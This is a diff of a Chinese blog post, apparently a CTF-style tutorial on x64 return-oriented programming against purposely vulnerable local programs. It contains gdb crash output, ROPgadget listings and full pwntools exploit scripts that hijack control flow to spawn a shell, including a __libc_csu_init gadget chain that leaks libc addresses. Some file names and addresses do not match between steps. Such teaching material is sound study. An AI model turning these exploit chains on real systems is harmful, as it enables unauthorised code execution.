@@ -5,16 +5,16 @@
   
   <title>pwn学习rop之x64篇 | YungGong</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Yun’s Bolg">
+  <meta name="description" content="pwn学习rop之x64篇">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn学习rop之x64篇">
 <meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/11/21/pwn学习rop之x64篇/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="Yun’s Bolg">
-<meta property="og:updated_time" content="2016-11-24T07:26:38.711Z">
+<meta property="og:description" content="pwn学习rop之x64篇">
+<meta property="og:updated_time" content="2016-11-28T13:21:02.074Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn学习rop之x64篇">
-<meta name="twitter:description" content="Yun’s Bolg">
+<meta name="twitter:description" content="pwn学习rop之x64篇">
   
     <link rel="alternative" href="/atom.xml" title="YungGong" type="application/atom+xml">
   
@@ -263,7 +263,421 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <h1 id="pwn学习rop之x64篇"><a href="#pwn学习rop之x64篇" class="headerlink" title="pwn学习rop之x64篇"></a>pwn学习rop之x64篇</h1><a id="more"></a>
+<h2 id="0x00-linux-64与linux-86的区别"><a href="#0x00-linux-64与linux-86的区别" class="headerlink" title="0x00 linux_64与linux_86的区别"></a>0x00 linux_64与linux_86的区别</h2><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>我们还是拿实际程序做例子进行讲解,test.c内容如下：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void callsystem()
+{
+    system(&quot;/bin/sh&quot;);
+}
+
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 512);
+}
+
+int main(int argc, char** argv) {
+    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
+    vulnerable_function();
+}
+</code></pre><p>我们打开ASLR并用如下方法编译：</p>
+<pre><code>$ gcc -fno-stack-protector test.c -o test3
+</code></pre><p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p>
+<pre><code>gdb-peda$ pattern create 150
+&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;
+</code></pre><p>然后r输入这个字符串造成程序崩溃</p>
+<pre><code>gdb-peda$ r
+Starting program: /home/heyuan/桌面/test3 
+Hello, World
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
+
+Program received signal SIGSEGV, Segmentation fault.
+
+ [----------------------------------registers-----------------------------------]
+RAX: 0x97 
+RBX: 0x0 
+RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
+RDX: 0x200 
+RSI: 0x7fffffffdc10 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n&quot;)
+RDI: 0x0 
+RBP: 0x6c41415041416b41 (&apos;AkAAPAAl&apos;)
+RSP: 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
+RIP: 0x4005e7 (&lt;vulnerable_function+32&gt;:    ret)
+R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
+R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
+R10: 0x37b 
+R11: 0x246 
+R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
+R13: 0x7fffffffdd90 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4005e0 &lt;vulnerable_function+25&gt;:    call   0x400490 &lt;read@plt&gt;
+   0x4005e5 &lt;vulnerable_function+30&gt;:    nop
+   0x4005e6 &lt;vulnerable_function+31&gt;:    leave  
+=&gt; 0x4005e7 &lt;vulnerable_function+32&gt;:    ret    
+   0x4005e8 &lt;main&gt;:    push   rbp
+   0x4005e9 &lt;main+1&gt;:    mov    rbp,rsp
+   0x4005ec &lt;main+4&gt;:    sub    rsp,0x10
+   0x4005f0 &lt;main+8&gt;:    mov    DWORD PTR [rbp-0x4],edi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
+0008| 0x7fffffffdca0 --&gt; 0xa41416f414152 (&apos;RAAoAA\n&apos;)
+0016| 0x7fffffffdca8 --&gt; 0x100000000 
+0024| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
+0032| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
+0040| 0x7fffffffdcc0 --&gt; 0x0 
+0048| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe172 (&quot;/home/heyuan/桌面/test3&quot;)
+0056| 0x7fffffffdcd0 --&gt; 0x100000000 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004005e7 in vulnerable_function ()
+</code></pre><p>PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。就是因为我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
+<pre><code>gdb-peda$ x/gx $rsp
+0x7fffffffdc98:    0x41416d4141514141
+</code></pre><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p>
+<pre><code>gdb-peda$ pattern offset 0x41416d4141514141
+4702159612987654465 found at offset: 136
+</code></pre><p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针。</p>
+<pre><code>$ python -c &apos;print &quot;A&quot;*136+&quot;ABCDEF\x00\x00&quot;&apos; &gt; payload
+
+gdb-peda$ r &lt; payload 
+Starting program: /home/heyuan/桌面/test3 &lt; payload
+Hello, World
+
+Program received signal SIGSEGV, Segmentation fault.
+
+ [----------------------------------registers-----------------------------------]
+RAX: 0x91 
+RBX: 0x0 
+RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
+RDX: 0x200 
+RSI: 0x7fffffffdc10 (&apos;A&apos; &lt;repeats 137 times&gt;, &quot;BCDEF&quot;)
+RDI: 0x0 
+RBP: 0x4141414141414141 (&apos;AAAAAAAA&apos;)
+RSP: 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
+RIP: 0x464544434241 (&apos;ABCDEF&apos;)
+R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
+R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
+R10: 0x37b 
+R11: 0x246 
+R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
+R13: 0x7fffffffdd90 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x464544434241
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
+0008| 0x7fffffffdca8 --&gt; 0x100000000 
+0016| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
+0024| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
+0032| 0x7fffffffdcc0 --&gt; 0x0 
+0040| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe171 (&quot;/home/heyuan/桌面/test3&quot;)
+0048| 0x7fffffffdcd0 --&gt; 0x100000000 
+0056| 0x7fffffffdcd8 --&gt; 0x4005e8 (&lt;main&gt;:    push   rbp)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000464544434241 in ?? ()
+</code></pre><p>可以看到我们已经成功的控制了PC的指针了。所以最终的exp如下：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+elf = ELF(&apos;level3&apos;)
+
+p = process(&apos;./level3&apos;)
+#p = remote(&apos;127.0.0.1&apos;,10001)
+
+callsystem = 0x0000000000400584
+
+payload = &quot;A&quot;*136 + p64(callsystem)
+
+p.send(payload)
+
+p.interactive()
+</code></pre><h2 id="0x02使用工具寻找gadgets"><a href="#0x02使用工具寻找gadgets" class="headerlink" title="0x02使用工具寻找gadgets"></a>0x02使用工具寻找gadgets</h2><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于 pop rdi; ret 的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p>
+<pre><code>ROPEME: https://github.com/packz/ropeme
+Ropper: https://github.com/sashs/Ropper
+ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
+rp++: https://github.com/0vercl0k/rp
+</code></pre><p>这些工具大致功能都差不多，下面结合例子讲一下，程序源码如下：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+void systemaddr()
+{
+    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);
+    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));
+    fflush(stdout);
+}
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 512);
+}
+int main(int argc, char** argv) {
+    systemaddr();
+    write(1, &quot;Hello, World\n&quot;, 13);
+    vulnerable_function();
+}
+</code></pre><p>编译：</p>
+<pre><code>gcc -fno-stack-protector test4.c -o test4 -ldl
+</code></pre><p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行 system(“/bin/sh”) 。但为了调用 system(“/bin/sh”) ，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下test4中所有pop ret的gadgets。</p>
+<pre><code>$ ROPgadget --binary test4 --only &quot;pop|ret&quot; 
+Gadgets information
+============================================================
+0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004008b0 : pop r14 ; pop r15 ; ret
+0x00000000004008b2 : pop r15 ; ret
+0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400700 : pop rbp ; ret
+0x00000000004008b3 : pop rdi ; ret
+0x00000000004008b1 : pop rsi ; pop r15 ; ret
+0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400601 : ret
+0x0000000000400682 : ret 0x2009
+</code></pre><p>我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p>
+<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
+</code></pre><p>另外，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链。</p>
+<pre><code>ROPgadget --binary libc.so --only &quot;pop|call&quot; | grep rdi
+0x0000000000195eab : call qword ptr [rdi + rbp*2 - 0x745c0000]
+0x000000000019a1e3 : call qword ptr [rdi + rbx + 2]
+0x000000000007d8b0 : call qword ptr [rdi]
+0x0000000000023e56 : call rdi
+0x0000000000106829 : pop rax ; pop rdi ; call rax
+0x000000000010682a : pop rdi ; call rax
+</code></pre><p>通过搜索结果我们发现，0x0000000000106829 : pop rax ; pop rdi ; call rax也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p>
+<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
+</code></pre><p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+libc = ELF(&apos;libc.so&apos;)
+
+p = process(&apos;./test4&apos;)
+#p = remote(&apos;127.0.0.1&apos;,10001)
+
+binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]
+print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)
+
+#pop_ret_offset = 0x0000000000022a12 - libc.symbols[&apos;system&apos;]
+#print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)
+
+pop_pop_call_offset = 0x0000000000106829 - libc.symbols[&apos;system&apos;]
+print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)
+
+print &quot;\n##########receiving system addr##########\n&quot;
+system_addr_str = p.recvuntil(&apos;\n&apos;)
+system_addr = int(system_addr_str,16)
+print &quot;system_addr = &quot; + hex(system_addr)
+
+binsh_addr = system_addr + binsh_addr_offset
+print &quot;binsh_addr = &quot; + hex(binsh_addr)
+
+
+#pop_ret_addr = system_addr + pop_ret_offset
+#print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)
+
+pop_pop_call_addr = system_addr + pop_pop_call_offset
+print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)
+
+p.recv()
+
+#payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 
+
+payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) 
+
+print &quot;\n##########sending payload##########\n&quot;
+p.send(payload)
+
+p.interactive()
+</code></pre><p>运行结果如下：</p>
+<pre><code>python test4.py 
+[*] &apos;/home/heyuan/\xe6\xa1\x8c\xe9\x9d\xa2/libc.so&apos;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process &apos;./test4&apos;: Done
+binsh_addr_offset = 0x146de7
+pop_pop_call_offset = 0xc1499
+
+##########receiving system addr##########
+
+system_addr = 0x7f17c39f1390
+binsh_addr = 0x7f17c3b38177
+pop_pop_call_addr = 0x7f17c3ab2829
+
+##########sending payload##########
+
+[*] Switching to interactive mode
+$ id
+uid=1000(heyuan) gid=1000(heyuan) 组=1000(heyuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(wireshark)
+</code></pre><h2 id="0x03-通用gadgets"><a href="#0x03-通用gadgets" class="headerlink" title="0x03 通用gadgets"></a>0x03 通用gadgets</h2><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p>
+<p>目标程序test5.c源码如下：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 512);
+}
+
+int main(int argc, char** argv) {
+    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
+    vulnerable_function();
+}
+</code></pre><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./test<br>5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
+<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
+  4005a0:   48 89 6c 24 d8          mov    %rbp,-0x28(%rsp)
+  4005a5:   4c 89 64 24 e0          mov    %r12,-0x20(%rsp)
+  4005aa:   48 8d 2d 73 08 20 00    lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;
+  4005b1:   4c 8d 25 6c 08 20 00    lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;
+  4005b8:   4c 89 6c 24 e8          mov    %r13,-0x18(%rsp)
+  4005bd:   4c 89 74 24 f0          mov    %r14,-0x10(%rsp)
+  4005c2:   4c 89 7c 24 f8          mov    %r15,-0x8(%rsp)
+  4005c7:   48 89 5c 24 d0          mov    %rbx,-0x30(%rsp)
+  4005cc:   48 83 ec 38             sub    $0x38,%rsp
+  4005d0:   4c 29 e5                sub    %r12,%rbp
+  4005d3:   41 89 fd                mov    %edi,%r13d
+  4005d6:   49 89 f6                mov    %rsi,%r14
+  4005d9:   48 c1 fd 03             sar    $0x3,%rbp
+  4005dd:   49 89 d7                mov    %rdx,%r15
+  4005e0:   e8 1b fe ff ff          callq  400400 &lt;_init&gt;
+  4005e5:   48 85 ed                test   %rbp,%rbp
+  4005e8:   74 1c                   je     400606 &lt;__libc_csu_init+0x66&gt;
+  4005ea:   31 db                   xor    %ebx,%ebx
+  4005ec:   0f 1f 40 00             nopl   0x0(%rax)
+  4005f0:   4c 89 fa                mov    %r15,%rdx
+  4005f3:   4c 89 f6                mov    %r14,%rsi
+  4005f6:   44 89 ef                mov    %r13d,%edi
+  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)
+  4005fd:   48 83 c3 01             add    $0x1,%rbx
+  400601:   48 39 eb                cmp    %rbp,%rbx
+  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;
+  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx
+  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp
+  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12
+  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13
+  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14
+  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15
+  400624:   48 83 c4 38             add    $0x38,%rsp
+  400628:   c3                      retq   
+</code></pre><p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
+<p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p>
+<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#write(rdi=1, rsi=write.got, rdx=4)
+payload1 =  &quot;\x00&quot;*136
+payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload1 += &quot;\x00&quot;*56
+payload1 += p64(main)
+</code></pre><p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p>
+<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#read(rdi=0, rsi=bss_addr, rdx=16)
+payload2 =  &quot;\x00&quot;*136
+payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload2 += &quot;\x00&quot;*56
+payload2 += p64(main)
+</code></pre><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
+<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
+payload3 =  &quot;\x00&quot;*136
+payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload3 += &quot;\x00&quot;*56
+payload3 += p64(main)
+</code></pre><p>最终exp如下：</p>
+<pre><code>#!python
+#!/usr/bin/env python
+from pwn import *
+
+elf = ELF(&apos;level5&apos;)
+libc = ELF(&apos;libc.so.6&apos;)
+
+p = process(&apos;./level5&apos;)
+#p = remote(&apos;127.0.0.1&apos;,10001)
+
+got_write = elf.got[&apos;write&apos;]
+print &quot;got_write: &quot; + hex(got_write)
+got_read = elf.got[&apos;read&apos;]
+print &quot;got_read: &quot; + hex(got_read)
+
+main = 0x400564
+
+off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]
+print &quot;off_system_addr: &quot; + hex(off_system_addr)
+
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#write(rdi=1, rsi=write.got, rdx=4)
+payload1 =  &quot;\x00&quot;*136
+payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload1 += &quot;\x00&quot;*56
+payload1 += p64(main)
+
+p.recvuntil(&quot;Hello, World\n&quot;)
+
+print &quot;\n#############sending payload1#############\n&quot;
+p.send(payload1)
+sleep(1)
+
+write_addr = u64(p.recv(8))
+print &quot;write_addr: &quot; + hex(write_addr)
+
+system_addr = write_addr - off_system_addr
+print &quot;system_addr: &quot; + hex(system_addr)
+
+bss_addr=0x601028
+
+p.recvuntil(&quot;Hello, World\n&quot;)
+
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#read(rdi=0, rsi=bss_addr, rdx=16)
+payload2 =  &quot;\x00&quot;*136
+payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload2 += &quot;\x00&quot;*56
+payload2 += p64(main)
+
+print &quot;\n#############sending payload2#############\n&quot;
+p.send(payload2)
+sleep(1)
+
+p.send(p64(system_addr))
+p.send(&quot;/bin/sh\0&quot;)
+sleep(1)
+
+p.recvuntil(&quot;Hello, World\n&quot;)
+
+#rdi=  edi = r13,  rsi = r14, rdx = r15 
+#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
+payload3 =  &quot;\x00&quot;*136
+payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
+payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
+payload3 += &quot;\x00&quot;*56
+payload3 += p64(main)
+
+print &quot;\n#############sending payload3#############\n&quot;
+
+sleep(1)
+p.send(payload3)
+</code></pre>
       
     </div>
     
@@ -274,7 +688,7 @@
         <p><span>本文标题:</span><a href="/2016/11/21/pwn学习rop之x64篇/">pwn学习rop之x64篇</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Yun 的个人博客">Yun</a></p>
         <p><span>发布时间:</span>2016年11月21日 - 16时54分</p>
-        <p><span>最后更新:</span>2016年11月24日 - 15时26分</p>
+        <p><span>最后更新:</span>2016年11月28日 - 21时21分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/11/21/pwn学习rop之x64篇/" title="pwn学习rop之x64篇">http://yunnigu.dropsec.xyz/2016/11/21/pwn学习rop之x64篇/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/11/21/pwn学习rop之x64篇/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -290,11 +704,11 @@
 
 <nav id="article-nav">
   
-    <a href="/2016/11/24/pwn学习rop之x64/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/11/24/reverse之第一更/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          pwn学习rop之x64
+          reverse之第一更
         
       </div>
     </a>
@@ -312,7 +726,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn学习rop之x64篇"><span class="toc-number">1.</span> <span class="toc-text">pwn学习rop之x64篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-linux-64与linux-86的区别"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 linux_64与linux_86的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02使用工具寻找gadgets"><span class="toc-number">1.2.</span> <span class="toc-text">0x02使用工具寻找gadgets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-通用gadgets"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 通用gadgets</span></a></li></ol></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -383,7 +797,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/11/24/pwn学习rop之x64/" title="上一篇: pwn学习rop之x64">
+            <a href="/2016/11/24/reverse之第一更/" title="上一篇: reverse之第一更">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -394,7 +808,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/python基于numpy解方程组/">python基于numpy解方程组</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/24/reverse之第一更/">reverse之第一更</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/24/pwn学习rop之x64/">pwn学习rop之x64</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/pwn学习rop之x64篇/">pwn学习rop之x64篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/pwn学习之DynELF的使用/">pwn学习之DynELF的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/pwn学习rop之x86篇/">pwn学习rop之x86篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/pwn第二更-Icectf-drumpfhotel/">pwn第二更-Icectf_drumpfhotel</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/pwn第一更-L-CTFpwn100/">pwn第一更-L-CTFpwn100</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/memset函数的用法/">memset函数的用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/20/java之Tostring和HashCode方法的重写/">java之Tostring、equals和HashCode方法的重写</a></li><li class="post-list-item"><a class="post-list-link" 